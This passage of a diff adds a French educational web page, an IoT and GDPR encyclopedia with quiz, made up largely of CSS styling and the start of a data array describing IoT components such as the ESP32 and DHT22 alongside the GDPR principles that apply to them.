@@ -1,0 +1,2464 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Encyclopédie IoT & RGPD — TheRustLab</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://api.fontshare.com/v2/css?f[]=general-sans@400,500,600,700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+/* =============================================
+   THERUST LAB — Encyclopédie IoT & RGPD
+   Design System: Dark cyber palette + warm accents
+   ============================================= */
+
+:root, [data-theme="dark"] {
+  --color-bg: #0f1117;
+  --color-surface: #161820;
+  --color-surface-2: #1c1e28;
+  --color-surface-offset: #1a1c26;
+  --color-surface-dynamic: #22242e;
+  --color-divider: #2a2c38;
+  --color-border: #333548;
+  --color-text: #e2e4ec;
+  --color-text-muted: #8b8ea0;
+  --color-text-faint: #555770;
+  --color-text-inverse: #0f1117;
+  --color-primary: #00B4D8;
+  --color-primary-hover: #0098b8;
+  --color-primary-active: #007a96;
+  --color-primary-highlight: #00B4D820;
+  --color-accent: #B85C38;
+  --color-accent-hover: #a04e30;
+  --color-accent-highlight: #B85C3820;
+  --color-success: #4ade80;
+  --color-success-bg: #4ade8015;
+  --color-error: #f87171;
+  --color-error-bg: #f8717115;
+  --color-warning: #fbbf24;
+  --color-warning-bg: #fbbf2415;
+  --font-body: 'General Sans', -apple-system, sans-serif;
+  --font-mono: 'JetBrains Mono', 'Fira Code', monospace;
+  --text-xs: clamp(0.75rem, 0.7rem + 0.25vw, 0.8125rem);
+  --text-sm: clamp(0.8125rem, 0.78rem + 0.2vw, 0.875rem);
+  --text-base: clamp(0.9375rem, 0.9rem + 0.2vw, 1rem);
+  --text-lg: clamp(1.125rem, 1rem + 0.5vw, 1.25rem);
+  --text-xl: clamp(1.375rem, 1.1rem + 1vw, 1.75rem);
+  --space-1: 0.25rem;
+  --space-2: 0.5rem;
+  --space-3: 0.75rem;
+  --space-4: 1rem;
+  --space-5: 1.25rem;
+  --space-6: 1.5rem;
+  --space-8: 2rem;
+  --space-10: 2.5rem;
+  --space-12: 3rem;
+  --space-16: 4rem;
+  --radius-sm: 0.375rem;
+  --radius-md: 0.5rem;
+  --radius-lg: 0.75rem;
+  --transition: 180ms cubic-bezier(0.16, 1, 0.3, 1);
+  --shadow-sm: 0 1px 3px rgba(0,0,0,0.3);
+  --shadow-md: 0 4px 16px rgba(0,0,0,0.4);
+  --shadow-lg: 0 12px 40px rgba(0,0,0,0.5);
+  /* Family colors - IoT specific palette */
+  --fam-1: #06b6d4;  /* Architecture IoT */
+  --fam-2: #f97316;  /* Sécurité LoRaWAN */
+  --fam-3: #a855f7;  /* Données Personnelles */
+  --fam-4: #22c55e;  /* Données Sensibles */
+  --fam-5: #f59e0b;  /* Principes RGPD */
+  --fam-6: #3b82f6;  /* Développement & Code */
+  --fam-7: #7dd3fc;  /* Cloud & Architecture */
+  --fam-8: #8b5cf6;  /* Droits des Personnes */
+  --fam-9: #f43f5e;  /* Incidents & Conformité */
+  --fam-10: #10b981; /* Anonymisation & Pseudonymisation */
+}
+
+[data-theme="light"] {
+  --color-bg: #f4f5f7;
+  --color-surface: #ffffff;
+  --color-surface-2: #fafafa;
+  --color-surface-offset: #eef0f4;
+  --color-surface-dynamic: #e4e6ec;
+  --color-divider: #d4d6de;
+  --color-border: #c0c2cc;
+  --color-text: #1a1c26;
+  --color-text-muted: #5a5c70;
+  --color-text-faint: #8b8ea0;
+  --color-text-inverse: #f4f5f7;
+  --color-primary: #0088a8;
+  --color-primary-hover: #006d88;
+  --color-primary-active: #005568;
+  --color-primary-highlight: #0088a818;
+  --color-accent: #a04e30;
+  --color-accent-hover: #884020;
+  --color-accent-highlight: #a04e3018;
+  --color-success: #16a34a;
+  --color-success-bg: #16a34a12;
+  --color-error: #dc2626;
+  --color-error-bg: #dc262612;
+  --color-warning: #d97706;
+  --color-warning-bg: #d9770612;
+  --shadow-sm: 0 1px 3px rgba(0,0,0,0.08);
+  --shadow-md: 0 4px 16px rgba(0,0,0,0.1);
+  --shadow-lg: 0 12px 40px rgba(0,0,0,0.15);
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+html {
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  scroll-behavior: smooth;
+  scroll-padding-top: 80px;
+}
+
+body {
+  min-height: 100dvh;
+  font-family: var(--font-body);
+  font-size: var(--text-base);
+  line-height: 1.6;
+  color: var(--color-text);
+  background: var(--color-bg);
+}
+
+a, button, input, select { transition: all var(--transition); }
+button { cursor: pointer; background: none; border: none; font: inherit; color: inherit; }
+img { display: block; max-width: 100%; }
+
+.sr-only {
+  position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px;
+  overflow: hidden; clip: rect(0,0,0,0); white-space: nowrap; border: 0;
+}
+
+:focus-visible {
+  outline: 2px solid var(--color-primary);
+  outline-offset: 2px;
+  border-radius: var(--radius-sm);
+}
+
+::selection {
+  background: var(--color-primary-highlight);
+  color: var(--color-text);
+}
+
+/* =============================================
+   LAYOUT — Header, Nav, Main
+   ============================================= */
+
+.app-header {
+  position: sticky;
+  top: 0;
+  z-index: 100;
+  background: var(--color-surface);
+  border-bottom: 1px solid var(--color-divider);
+  padding: var(--space-4) var(--space-6);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: var(--space-4);
+}
+
+.app-logo {
+  display: flex;
+  align-items: center;
+  gap: var(--space-3);
+}
+
+.app-logo svg { flex-shrink: 0; }
+
+.app-logo-text h1 {
+  font-size: var(--text-lg);
+  font-weight: 700;
+  line-height: 1.2;
+  color: var(--color-text);
+}
+
+.app-logo-text span {
+  font-family: var(--font-mono);
+  font-size: var(--text-xs);
+  color: var(--color-text-muted);
+  letter-spacing: 0.5px;
+}
+
+.header-actions {
+  display: flex;
+  align-items: center;
+  gap: var(--space-2);
+}
+
+.theme-toggle {
+  width: 36px;
+  height: 36px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border-radius: var(--radius-md);
+  color: var(--color-text-muted);
+}
+
+.theme-toggle:hover {
+  background: var(--color-surface-dynamic);
+  color: var(--color-text);
+}
+
+/* NAV TABS */
+.nav-bar {
+  background: var(--color-surface);
+  border-bottom: 1px solid var(--color-divider);
+  padding: 0 var(--space-6);
+  display: flex;
+  gap: 0;
+  overflow-x: auto;
+  -webkit-overflow-scrolling: touch;
+}
+
+.nav-tab {
+  padding: var(--space-3) var(--space-5);
+  font-size: var(--text-sm);
+  font-weight: 500;
+  color: var(--color-text-muted);
+  border-bottom: 2px solid transparent;
+  white-space: nowrap;
+  position: relative;
+}
+
+.nav-tab:hover { color: var(--color-text); }
+
+.nav-tab.active {
+  color: var(--color-primary);
+  border-bottom-color: var(--color-primary);
+}
+
+/* CONTROLS BAR */
+.controls-bar {
+  padding: var(--space-4) var(--space-6);
+  display: flex;
+  align-items: center;
+  gap: var(--space-4);
+  flex-wrap: wrap;
+  background: var(--color-bg);
+}
+
+.search-box {
+  position: relative;
+  flex: 1;
+  min-width: 240px;
+  max-width: 480px;
+}
+
+.search-box input {
+  width: 100%;
+  padding: var(--space-2) var(--space-4) var(--space-2) 40px;
+  font-size: var(--text-sm);
+  color: var(--color-text);
+  background: var(--color-surface);
+  border: 1px solid var(--color-border);
+  border-radius: var(--radius-md);
+  outline: none;
+}
+
+.search-box input:focus {
+  border-color: var(--color-primary);
+  box-shadow: 0 0 0 3px var(--color-primary-highlight);
+}
+
+.search-box input::placeholder { color: var(--color-text-faint); }
+
+.search-icon {
+  position: absolute;
+  left: 12px;
+  top: 50%;
+  transform: translateY(-50%);
+  color: var(--color-text-faint);
+  pointer-events: none;
+}
+
+.counter {
+  font-family: var(--font-mono);
+  font-size: var(--text-xs);
+  color: var(--color-text-muted);
+  white-space: nowrap;
+}
+
+/* MAIN CONTENT */
+.main-content {
+  padding: var(--space-4) var(--space-6) var(--space-12);
+  max-width: 1200px;
+  margin: 0 auto;
+}
+
+/* VIEW TOGGLE */
+.view-section { display: none; }
+.view-section.active { display: block; }
+
+/* =============================================
+   FILTER PILLS
+   ============================================= */
+
+.filter-pills {
+  display: flex;
+  flex-wrap: wrap;
+  gap: var(--space-2);
+  margin-bottom: var(--space-6);
+}
+
+.filter-pill {
+  padding: 6px var(--space-3);
+  font-size: var(--text-xs);
+  font-weight: 500;
+  background: var(--color-surface);
+  color: var(--color-text-muted);
+  border: 1px solid var(--color-border);
+  border-radius: var(--radius-sm);
+}
+
+.filter-pill:hover {
+  border-color: var(--color-primary);
+  color: var(--color-text);
+}
+
+.filter-pill.active {
+  background: var(--color-primary);
+  color: var(--color-text-inverse);
+  border-color: var(--color-primary);
+}
+
+/* =============================================
+   FAMILY GROUPS & CARDS
+   ============================================= */
+
+.family-group { margin-bottom: var(--space-8); }
+
+.family-header {
+  display: flex;
+  align-items: baseline;
+  gap: var(--space-3);
+  margin-bottom: var(--space-4);
+  padding-bottom: var(--space-2);
+  border-bottom: 2px solid var(--fam-color, var(--color-divider));
+}
+
+.family-title {
+  font-size: var(--text-lg);
+  font-weight: 700;
+  color: var(--color-text);
+}
+
+.cards-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(min(300px, 100%), 1fr));
+  gap: var(--space-4);
+}
+
+.card {
+  background: var(--card-bg-color, var(--color-surface));
+  border: 1px solid var(--color-border);
+  border-radius: var(--radius-lg);
+  padding: var(--space-5);
+  display: flex;
+  flex-direction: column;
+  gap: var(--space-2);
+  min-height: 240px;
+  position: relative;
+  overflow: hidden;
+}
+
+.card::before {
+  content: '';
+  position: absolute;
+  top: 0; left: 0; right: 0;
+  height: 3px;
+  background: var(--fam-color, var(--color-primary));
+}
+
+.card:hover {
+  border-color: var(--fam-color, var(--color-primary));
+  box-shadow: var(--shadow-md);
+  transform: translateY(-2px);
+}
+
+.card-top {
+  display: flex;
+  justify-content: space-between;
+  align-items: flex-start;
+  gap: var(--space-2);
+}
+
+.card-name {
+  font-size: var(--text-base);
+  font-weight: 700;
+  color: var(--color-text);
+  line-height: 1.3;
+}
+
+.card-aka {
+  font-family: var(--font-mono);
+  font-size: var(--text-xs);
+  color: var(--color-text-faint);
+  padding-bottom: var(--space-2);
+  border-bottom: 1px solid var(--color-divider);
+}
+
+.card-desc {
+  font-size: var(--text-sm);
+  line-height: 1.6;
+  color: var(--color-text-muted);
+  flex: 1;
+}
+
+.card-example {
+  font-family: var(--font-mono);
+  font-size: var(--text-xs);
+  line-height: 1.5;
+  color: var(--color-text-faint);
+  padding: var(--space-2) var(--space-3);
+  background: var(--color-surface-offset);
+  border-radius: var(--radius-sm);
+  margin-top: auto;
+}
+
+/* =============================================
+   QUIZ SECTION
+   ============================================= */
+
+.quiz-home {
+  text-align: center;
+  padding: var(--space-12) var(--space-4);
+}
+
+.quiz-title {
+  font-size: var(--text-xl);
+  font-weight: 700;
+  margin-bottom: var(--space-4);
+  color: var(--color-text);
+}
+
+.quiz-subtitle {
+  font-size: var(--text-sm);
+  color: var(--color-text-muted);
+  margin-bottom: var(--space-8);
+  max-width: 600px;
+  margin-left: auto;
+  margin-right: auto;
+}
+
+.quiz-modes {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+  gap: var(--space-6);
+  margin-bottom: var(--space-8);
+}
+
+.quiz-mode-card {
+  background: var(--color-surface);
+  border: 1px solid var(--color-border);
+  border-radius: var(--radius-lg);
+  padding: var(--space-6);
+  cursor: pointer;
+  text-align: center;
+  transition: all var(--transition);
+}
+
+.quiz-mode-card:hover {
+  border-color: var(--color-primary);
+  box-shadow: var(--shadow-md);
+  transform: translateY(-4px);
+}
+
+.quiz-mode-card h3 {
+  font-size: var(--text-lg);
+  font-weight: 700;
+  margin-bottom: var(--space-2);
+  color: var(--color-text);
+}
+
+.quiz-mode-card p {
+  font-size: var(--text-sm);
+  color: var(--color-text-muted);
+  line-height: 1.5;
+}
+
+.quiz-config {
+  background: var(--color-surface);
+  border: 1px solid var(--color-border);
+  border-radius: var(--radius-lg);
+  padding: var(--space-6);
+  max-width: 600px;
+  margin: var(--space-8) auto;
+}
+
+.quiz-config-group {
+  margin-bottom: var(--space-6);
+  text-align: left;
+}
+
+.quiz-config-label {
+  display: block;
+  font-size: var(--text-sm);
+  font-weight: 600;
+  margin-bottom: var(--space-2);
+  color: var(--color-text);
+}
+
+.quiz-config-options {
+  display: flex;
+  gap: var(--space-2);
+  flex-wrap: wrap;
+}
+
+.quiz-config-btn {
+  padding: var(--space-2) var(--space-4);
+  font-size: var(--text-sm);
+  background: var(--color-surface-offset);
+  color: var(--color-text-muted);
+  border: 1px solid var(--color-border);
+  border-radius: var(--radius-md);
+}
+
+.quiz-config-btn:hover {
+  border-color: var(--color-primary);
+  color: var(--color-text);
+}
+
+.quiz-config-btn.selected {
+  background: var(--color-primary);
+  color: var(--color-text-inverse);
+  border-color: var(--color-primary);
+}
+
+.quiz-config-select {
+  width: 100%;
+  padding: var(--space-2) var(--space-3);
+  font-size: var(--text-sm);
+  background: var(--color-surface-offset);
+  color: var(--color-text);
+  border: 1px solid var(--color-border);
+  border-radius: var(--radius-md);
+}
+
+.quiz-config-select:focus {
+  border-color: var(--color-primary);
+  outline: none;
+}
+
+.quiz-start-btn {
+  width: 100%;
+  padding: var(--space-4);
+  font-size: var(--text-base);
+  font-weight: 600;
+  background: var(--color-primary);
+  color: var(--color-text-inverse);
+  border-radius: var(--radius-md);
+  margin-top: var(--space-4);
+}
+
+.quiz-start-btn:hover {
+  background: var(--color-primary-hover);
+}
+
+.quiz-game {
+  max-width: 800px;
+  margin: 0 auto;
+  padding: var(--space-6);
+}
+
+.quiz-progress-bar {
+  width: 100%;
+  height: 4px;
+  background: var(--color-surface-offset);
+  border-radius: var(--radius-sm);
+  overflow: hidden;
+  margin-bottom: var(--space-6);
+}
+
+.quiz-progress-fill {
+  height: 100%;
+  background: var(--color-primary);
+  transition: width var(--transition);
+}
+
+.quiz-progress-text {
+  font-size: var(--text-xs);
+  color: var(--color-text-muted);
+  margin-bottom: var(--space-4);
+  font-family: var(--font-mono);
+}
+
+.quiz-question {
+  background: var(--color-surface);
+  border: 1px solid var(--color-border);
+  border-radius: var(--radius-lg);
+  padding: var(--space-6);
+  margin-bottom: var(--space-6);
+}
+
+.quiz-question-text {
+  font-size: var(--text-lg);
+  font-weight: 600;
+  color: var(--color-text);
+  margin-bottom: var(--space-6);
+  line-height: 1.6;
+}
+
+.quiz-answers {
+  display: flex;
+  flex-direction: column;
+  gap: var(--space-3);
+}
+
+.quiz-answer-btn {
+  padding: var(--space-4);
+  text-align: left;
+  background: var(--color-surface-offset);
+  color: var(--color-text);
+  border: 1px solid var(--color-border);
+  border-radius: var(--radius-md);
+  font-size: var(--text-sm);
+  font-weight: 500;
+  transition: all var(--transition);
+}
+
+.quiz-answer-btn:hover {
+  border-color: var(--color-primary);
+  background: color-mix(in srgb, var(--color-primary) 10%, var(--color-surface-offset));
+}
+
+.quiz-answer-btn.correct {
+  background: var(--color-success-bg);
+  border-color: var(--color-success);
+  color: var(--color-success);
+}
+
+.quiz-answer-btn.incorrect {
+  background: var(--color-error-bg);
+  border-color: var(--color-error);
+  color: var(--color-error);
+}
+
+.quiz-answer-btn.selected {
+  border-color: var(--color-primary);
+  background: color-mix(in srgb, var(--color-primary) 20%, var(--color-surface-offset));
+}
+
+.quiz-answer-btn:disabled {
+  cursor: not-allowed;
+  opacity: 0.7;
+}
+
+.quiz-timer {
+  position: absolute;
+  top: var(--space-4);
+  right: var(--space-4);
+  font-family: var(--font-mono);
+  font-weight: 700;
+  font-size: var(--text-lg);
+  padding: var(--space-2) var(--space-4);
+  background: var(--color-surface-offset);
+  border-radius: var(--radius-md);
+  color: var(--color-primary);
+}
+
+.quiz-timer.warning {
+  color: var(--color-warning);
+}
+
+.quiz-timer.critical {
+  color: var(--color-error);
+}
+
+.quiz-results {
+  max-width: 800px;
+  margin: 0 auto;
+  padding: var(--space-6);
+  text-align: center;
+}
+
+.quiz-score {
+  font-size: 3rem;
+  font-weight: 700;
+  color: var(--color-primary);
+  margin-bottom: var(--space-2);
+  font-family: var(--font-mono);
+}
+
+.quiz-result-message {
+  font-size: var(--text-lg);
+  color: var(--color-text);
+  margin-bottom: var(--space-6);
+}
+
+.quiz-result-stats {
+  background: var(--color-surface);
+  border: 1px solid var(--color-border);
+  border-radius: var(--radius-lg);
+  padding: var(--space-6);
+  margin-bottom: var(--space-6);
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: var(--space-4);
+}
+
+.quiz-stat {
+  display: flex;
+  flex-direction: column;
+  gap: var(--space-2);
+}
+
+.quiz-stat-label {
+  font-size: var(--text-xs);
+  color: var(--color-text-muted);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+.quiz-stat-value {
+  font-size: var(--text-xl);
+  font-weight: 700;
+  color: var(--color-primary);
+  font-family: var(--font-mono);
+}
+
+.quiz-back-btn {
+  padding: var(--space-3) var(--space-6);
+  font-size: var(--text-sm);
+  font-weight: 600;
+  background: var(--color-surface);
+  color: var(--color-text);
+  border: 1px solid var(--color-border);
+  border-radius: var(--radius-md);
+}
+
+.quiz-back-btn:hover {
+  border-color: var(--color-primary);
+  color: var(--color-primary);
+}
+
+@media (max-width: 600px) {
+  .quiz-result-stats {
+    grid-template-columns: 1fr;
+  }
+  .app-logo-text h1 {
+    font-size: var(--text-base);
+  }
+  .controls-bar {
+    flex-direction: column;
+    align-items: stretch;
+  }
+  .search-box {
+    max-width: 100%;
+  }
+  .quiz-timer {
+    position: static;
+    margin-bottom: var(--space-4);
+  }
+  .quiz-match-container { grid-template-columns: 1fr; }
+  .quiz-tf-buttons { grid-template-columns: 1fr; }
+}
+
+/* =============================================
+   QUIZ — Question card
+   ============================================= */
+
+.quiz-home { padding: var(--space-2) 0; }
+.quiz-title { font-size: var(--text-xl); font-weight: 700; margin-bottom: var(--space-2); color: var(--color-text); }
+.quiz-subtitle { color: var(--color-text-muted); margin-bottom: var(--space-8); font-size: var(--text-sm); }
+
+.quiz-mode-icon {
+  font-size: 1.5rem;
+  display: block;
+  margin-bottom: var(--space-3);
+  color: var(--color-primary);
+}
+.quiz-mode-count {
+  display: inline-block;
+  margin-top: var(--space-2);
+  font-family: var(--font-mono);
+  font-size: var(--text-xs);
+  color: var(--color-text-faint);
+  background: var(--color-surface-offset);
+  padding: 2px 8px;
+  border-radius: var(--radius-sm);
+}
+
+.quiz-question-card {
+  background: var(--color-surface);
+  border: 1px solid var(--color-border);
+  border-radius: var(--radius-lg);
+  padding: var(--space-6);
+  position: relative;
+}
+
+.quiz-question-label {
+  font-family: var(--font-mono);
+  font-size: var(--text-xs);
+  font-weight: 700;
+  color: var(--color-primary);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin-bottom: var(--space-4);
+}
+
+.quiz-concept-highlight {
+  font-size: var(--text-xl);
+  font-weight: 700;
+  color: var(--color-text);
+  background: var(--color-primary-highlight);
+  border-left: 3px solid var(--color-primary);
+  padding: var(--space-3) var(--space-4);
+  border-radius: var(--radius-sm);
+  margin-bottom: var(--space-6);
+  line-height: 1.4;
+}
+
+.quiz-answer-btn {
+  display: flex;
+  align-items: flex-start;
+  gap: 0;
+  line-height: 1.5;
+}
+
+.quiz-answer-key {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  min-width: 24px;
+  height: 24px;
+  font-family: var(--font-mono);
+  font-size: 11px;
+  font-weight: 700;
+  border-radius: var(--radius-sm);
+  background: var(--color-surface-dynamic);
+  color: var(--color-text-muted);
+  margin-right: var(--space-3);
+  flex-shrink: 0;
+  margin-top: 1px;
+}
+
+.quiz-answer-btn.answer-correct,
+.quiz-answer-btn.correct {
+  background: var(--color-success-bg);
+  border-color: var(--color-success);
+  color: var(--color-success);
+}
+.quiz-answer-btn.answer-wrong,
+.quiz-answer-btn.incorrect {
+  background: var(--color-error-bg);
+  border-color: var(--color-error);
+  color: var(--color-error);
+}
+
+.quiz-feedback {
+  display: none;
+  margin-top: var(--space-4);
+  padding: var(--space-3) var(--space-4);
+  border-radius: var(--radius-md);
+  font-size: var(--text-sm);
+  font-weight: 500;
+  line-height: 1.5;
+}
+.quiz-feedback.show { display: block; }
+.quiz-feedback.feedback-ok {
+  background: var(--color-success-bg);
+  color: var(--color-success);
+  border: 1px solid color-mix(in srgb, var(--color-success) 30%, transparent);
+}
+.quiz-feedback.feedback-ko {
+  background: var(--color-error-bg);
+  color: var(--color-error);
+  border: 1px solid color-mix(in srgb, var(--color-error) 30%, transparent);
+}
+
+.quiz-next-btn {
+  display: none;
+  width: 100%;
+  margin-top: var(--space-4);
+  padding: var(--space-3) var(--space-4);
+  font-size: var(--text-sm);
+  font-weight: 600;
+  background: var(--color-primary);
+  color: var(--color-text-inverse);
+  border-radius: var(--radius-md);
+  text-align: center;
+  cursor: pointer;
+  border: none;
+  transition: background var(--transition);
+}
+.quiz-next-btn.visible { display: block; }
+.quiz-next-btn:hover { background: var(--color-primary-hover); }
+
+/* Vrai / Faux */
+.quiz-tf-aka {
+  font-family: var(--font-mono);
+  font-size: var(--text-base);
+  font-weight: 600;
+  color: var(--color-text);
+  background: var(--color-surface-offset);
+  border: 1px solid var(--color-border);
+  border-left: 3px solid var(--color-accent);
+  padding: var(--space-3) var(--space-4);
+  border-radius: var(--radius-sm);
+  margin: var(--space-4) 0;
+  line-height: 1.5;
+}
+
+.quiz-tf-buttons {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: var(--space-3);
+  margin-top: var(--space-4);
+}
+
+.quiz-tf-btn {
+  padding: var(--space-4);
+  font-size: var(--text-base);
+  font-weight: 700;
+  background: var(--color-surface-offset);
+  color: var(--color-text);
+  border: 2px solid var(--color-border);
+  border-radius: var(--radius-md);
+  cursor: pointer;
+  transition: all var(--transition);
+}
+.quiz-tf-btn:hover:not(:disabled) {
+  border-color: var(--color-primary);
+  background: var(--color-primary-highlight);
+}
+.quiz-tf-btn.answer-correct {
+  background: var(--color-success-bg);
+  border-color: var(--color-success);
+  color: var(--color-success);
+}
+.quiz-tf-btn.answer-wrong {
+  background: var(--color-error-bg);
+  border-color: var(--color-error);
+  color: var(--color-error);
+}
+.quiz-tf-btn:disabled { cursor: not-allowed; opacity: 0.7; }
+
+/* Association (match) */
+.quiz-match-container {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: var(--space-6);
+  margin-top: var(--space-4);
+}
+
+.quiz-match-col-header {
+  font-size: var(--text-xs);
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  color: var(--color-text-muted);
+  font-family: var(--font-mono);
+  margin-bottom: var(--space-3);
+}
+
+.match-item {
+  padding: var(--space-3) var(--space-4);
+  background: var(--color-surface-offset);
+  border: 2px solid var(--color-border);
+  border-radius: var(--radius-md);
+  font-size: var(--text-sm);
+  cursor: pointer;
+  transition: all var(--transition);
+  margin-bottom: var(--space-2);
+  user-select: none;
+  line-height: 1.4;
+}
+.match-item:hover:not(.match-paired) {
+  border-color: var(--color-primary);
+  background: var(--color-primary-highlight);
+}
+.match-item.match-selected {
+  border-color: var(--color-primary);
+  background: var(--color-primary-highlight);
+  color: var(--color-primary);
+  font-weight: 600;
+}
+.match-item.match-paired { cursor: default; font-weight: 600; }
+
+.match-pairs-display {
+  margin-top: var(--space-4);
+  display: flex;
+  flex-direction: column;
+  gap: var(--space-2);
+}
+
+.match-pair-badge {
+  display: flex;
+  align-items: center;
+  gap: var(--space-2);
+  padding: var(--space-2) var(--space-3);
+  border: 1px solid var(--color-border);
+  border-radius: var(--radius-sm);
+  font-size: var(--text-xs);
+  background: var(--color-surface-offset);
+  flex-wrap: wrap;
+}
+.match-pair-badge .pair-name { font-weight: 700; flex-shrink: 0; }
+.match-pair-badge .pair-sep { color: var(--color-text-faint); }
+.pair-ok {
+  border-color: var(--color-success) !important;
+  color: var(--color-success) !important;
+  background: var(--color-success-bg) !important;
+}
+.pair-ko {
+  border-color: var(--color-error) !important;
+  color: var(--color-error) !important;
+  background: var(--color-error-bg) !important;
+}
+.pair-correction {
+  font-family: var(--font-mono);
+  font-style: italic;
+  opacity: 0.8;
+  font-size: 10px;
+}
+
+/* Back link in config */
+.quiz-back-link {
+  background: none;
+  border: none;
+  color: var(--color-text-muted);
+  font-size: var(--text-sm);
+  cursor: pointer;
+  margin-bottom: var(--space-4);
+  display: inline-flex;
+  align-items: center;
+  gap: var(--space-1);
+  padding: 0;
+  transition: color var(--transition);
+}
+.quiz-back-link:hover { color: var(--color-text); }
+
+/* Score colors */
+.score-perfect { color: var(--color-success) !important; }
+.score-great   { color: #4ade80 !important; }
+.score-good    { color: var(--color-warning) !important; }
+.score-medium  { color: #f97316 !important; }
+.score-low     { color: var(--color-error) !important; }
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header class="app-header">
+  <div class="app-logo">
+    <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <rect x="2" y="2" width="28" height="28" rx="6" fill="none" stroke="currentColor" stroke-width="2"/>
+      <path d="M16 8V24M8 16H24" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+      <circle cx="16" cy="16" r="3" fill="currentColor"/>
+    </svg>
+    <div class="app-logo-text">
+      <h1>Encyclopédie IoT & RGPD</h1>
+      <span>TheRustLab</span>
+    </div>
+  </div>
+  <div class="header-actions">
+    <button class="theme-toggle" id="themeToggle" title="Basculer le thème">
+      <span id="themeIcon">◐</span>
+    </button>
+  </div>
+</header>
+
+<!-- NAV TABS -->
+<nav class="nav-bar">
+  <button class="nav-tab active" data-view="encyclopedia">Encyclopédie</button>
+  <button class="nav-tab" data-view="quiz">Quiz</button>
+</nav>
+
+<!-- CONTROLS BAR (Encyclopédie) -->
+<div id="encyclopediaControls" class="controls-bar">
+  <div class="search-box">
+    <span class="search-icon">◉</span>
+    <input type="text" id="searchInput" placeholder="Chercher un concept...">
+  </div>
+  <div class="counter">
+    <span id="conceptCount">0</span> concept<span id="pluralS">s</span>
+  </div>
+</div>
+
+<!-- MAIN CONTENT -->
+<main class="main-content">
+
+  <!-- ENCYCLOPÉDIE VIEW -->
+  <section id="encyclopediaView" class="view-section active">
+    <div class="filter-pills" id="filterPills"></div>
+    <div id="familiesContainer"></div>
+  </section>
+
+  <!-- QUIZ VIEW -->
+  <section id="quizView" class="view-section">
+    <div id="quizHome" class="quiz-home"></div>
+    <div id="quizConfig" style="display: none;"></div>
+    <div id="quizGame" style="display: none;" class="quiz-game"></div>
+    <div id="quizResults" style="display: none;" class="quiz-results"></div>
+  </section>
+
+</main>
+
+<script>
+// ============================================
+// DATA: 10 Families with 140 total cards
+// ============================================
+
+const families = [
+  {
+    id: 1,
+    name: "Architecture IoT",
+    color: "#06b6d4",
+    bgColor: "#0C353D",
+    cards: [
+      {
+        name: "ESP32",
+        aka: "Microcontroleur Edge",
+        desc: "Microcontroleur dual-core Wi-Fi/BLE largement utilisé dans les projets IoT. Permet le traitement local des données (edge computing) pour ne transmettre que des agrégats, appliquant ainsi le principe de minimisation (Art. 5.1.c RGPD).",
+        example: "ESP32 + DHT22 -> agréger les mesures localement avant envoi LoRaWAN"
+      },
+      {
+        name: "Module RAK3172",
+        aka: "Modem LoRaWAN (STM32WLE5)",
+        desc: "Module radio LoRaWAN intégrant le chiffrement AES-128 au niveau de la couche physique (Art. 32 RGPD). La gestion matérielle des clés réduit la surface d'attaque par rapport à une implémentation purement logicielle.",
+        example: "AT+JOIN -> négociation OTAA avec chiffrement matériel"
+      },
+      {
+        name: "Capteur DHT22",
+        aka: "Thermo-hygromètre numérique",
+        desc: "Capteur de température et d'humidité. Donnée anonyme par défaut, elle devient personnelle dès qu'elle est associée à un domicile identifié (croisement contextuel). Illustration du caractère relatif de la qualification juridique d'une donnée.",
+        example: "23.5°C + identifiant logement = donnée personnelle"
+      },
+      {
+        name: "Photorésistance",
+        aka: "Capteur de luminosité analogique",
+        desc: "Mesure le niveau de lumière ambiante. Par inférence, les cycles de luminosité peuvent révéler des habitudes de présence ou de sommeil d'un individu, transformant une donnée physique en donnée personnelle indirecte.",
+        example: "Luminosité faible entre 23h et 7h -> rythme de sommeil"
+      },
+      {
+        name: "Deep Sleep",
+        aka: "Mode veille profonde (ULP)",
+        desc: "Mode basse consommation où le microcontroleur coupe Wi-Fi/BLE et la majorité de ses périphériques. Réduit la surface d'attaque réseau en limitant le temps de connexion active, principe de privacy by design (Art. 25 RGPD).",
+        example: "ESP32 deep sleep 15 min -> réveil, mesure, envoi, veille"
+      },
+      {
+        name: "RTC Memory",
+        aka: "Mémoire persistante 8 Ko",
+        desc: "Zone mémoire conservée pendant le deep sleep permettant de stocker des variables entre deux cycles de réveil. Attention à la politique de purge : des données personnelles stockées sans durée définie violent le principe de limitation de conservation (Art. 5.1.e).",
+        example: "rtcData.lastTemp = 23.5 -> conservé entre deux reveils"
+      },
+      {
+        name: "Capteur MAX30102",
+        aka: "Oxymètre/Cardiomètre optique",
+        desc: "Capteur de rythme cardiaque et de SpO2. Donnée de santé au sens de l'article 9 RGPD : traitement interdit sauf consentement explicite ou finalité médicale. Hébergement HDS (Hébergeur de Données de Santé) obligatoire en France.",
+        example: "BPM + SpO2 -> hébergeur certifié HDS obligatoire"
+      },
+      {
+        name: "End Device",
+        aka: "Nœud IoT LoRaWAN (Classe A/B/C)",
